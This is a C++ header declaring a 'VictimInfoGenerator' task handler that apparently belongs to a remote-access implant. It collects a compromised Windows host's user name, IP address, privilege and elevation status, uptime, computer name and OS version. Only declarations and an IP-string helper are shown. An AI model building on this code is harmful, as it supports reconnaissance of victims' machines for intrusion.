#ifndef VICTIM_INFO_HPP
#define VICTIM_INFO_HPP

#include "task_handler_interface.h"
#include "request.hpp"
#include "reply.hpp"
#include "mime_types.hpp"

#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <iostream>
#include <bitset>
#include <sstream>
#include <sysinfoapi.h>
#include <VersionHelpers.h>


#pragma comment(lib, "ws2_32.lib")

namespace http {
	namespace server {

		class VictimInfoGenerator : public TaskHandlerInterface
		{
			public:

				static wchar_t* _GetUserNameW();

				struct IPv4
				{
					unsigned char b1, b2, b3, b4;

					wchar_t* GetWideCharIp()
					{
						char* ipAddress = new char[16];
						memset(ipAddress, 0, 16);
						char* char_digit = new char[4];
						itoa(b1, char_digit, 10);
						strcat(ipAddress, char_digit);
						strcat(ipAddress, ".");
						itoa(b2, char_digit, 10);
						strcat(ipAddress, char_digit);
						strcat(ipAddress, ".");
						itoa(b3, char_digit, 10);
						strcat(ipAddress, char_digit);
						strcat(ipAddress, ".");
						itoa(b4, char_digit, 10);
						strcat(ipAddress, char_digit);

						size_t size = mbstowcs(NULL, ipAddress, 0);
						wchar_t* ipAddressW = new wchar_t[size + 1];
						memset(ipAddressW, 0, size * sizeof(wchar_t) + sizeof(wchar_t));
						mbstowcs(ipAddressW, ipAddress, size + 1);
						return ipAddressW;
					}
				};

				static wchar_t* GetLocalIpAddress();

				static BOOL IsElevated();

				static wchar_t* _GetPrivileges();

				static wchar_t* GetUpTime();

				static wchar_t* _GetComputerName();

				static wchar_t* _GetWindowsVersion();

				static std::tuple<int, std::vector<char>> GetVictimInfo();

				bool execute(std::shared_ptr<request> req, std::shared_ptr<reply> rep) override;
		};
	}
}
#endif